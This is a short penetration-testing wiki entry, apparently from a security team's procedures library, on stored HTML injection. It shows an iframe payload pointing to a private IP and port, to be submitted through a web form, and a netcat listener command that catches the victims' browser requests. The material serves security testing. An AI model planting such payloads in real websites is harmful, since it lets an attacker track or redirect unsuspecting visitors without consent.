---
id: 4417ce3e-a88e-4801-ac81-01fd5bd6686f
name: HTML Injection Stored
type: procedure
verified: true
submitted: true
created_at: '2020-07-27T17:11:46.410466+00:00'
updated_at: '2023-05-26T18:41:27.082450+00:00'
platforms:
- Web
tags:
- '[[HTML Injection]]'
- '[[injection]]'
- '[[stored HTML injection]]'
- '[[Web Applications]]'
commands:
- '[[nc.exe -lvp 9999]]'
- '[[Netcat windows in listening mode on port 80]]'
---

# HTML Injection Stored

**Status**: ✓ Verified

## Summary

In HTML stored injection , an attacker can maliciously inject code into HTML pages. The injected code in the page when accessed by the victim/user will get parsed and executed without knowing of the user. 

## Description

# Description

In HTML stored injection , an attacker can maliciously inject code into *HTML *pages. The injected code in the page when accessed by the victim/user will get parsed and executed without knowing of the user.

# 

# Instructions

1.Below image has a text box with submit option in the page .





![7201fae2-046a-43d1-ac9c-5b1e6d80e9a4.PNG](_assets/images/Mash/7201fae2-046a-43d1-ac9c-5b1e6d80e9a4.PNG)







2.Place the *payload  *in the text box of the image as hown below and click on submit.

*Payload : <div><iframe SRC="http://192.168.43.183:9999"*



![5ec7d982-1dc3-44e1-8b11-c384553090ca.PNG](_assets/images/Mash/5ec7d982-1dc3-44e1-8b11-c384553090ca.PNG)



3. Run netcat in listening mode before submitting the above request.







**Command** ([[nc.exe -lvp 9999]]):

```bash
nc.exe -lvp 9999
```







4.After submitting the request in step 3 , observe the response in *netcat *command window . Response from the submitted request can be observed as shown below.









![4c511bba-cc3c-4c5e-9be7-d528d7dcbb28.PNG]()









## Platforms

- Web

## Commands Used

- [[nc.exe -lvp 9999]]
- [[Netcat windows in listening mode on port 80]]

## Tags

- [[HTML Injection]]
- [[injection]]
- [[stored HTML injection]]
- [[Web Applications]]


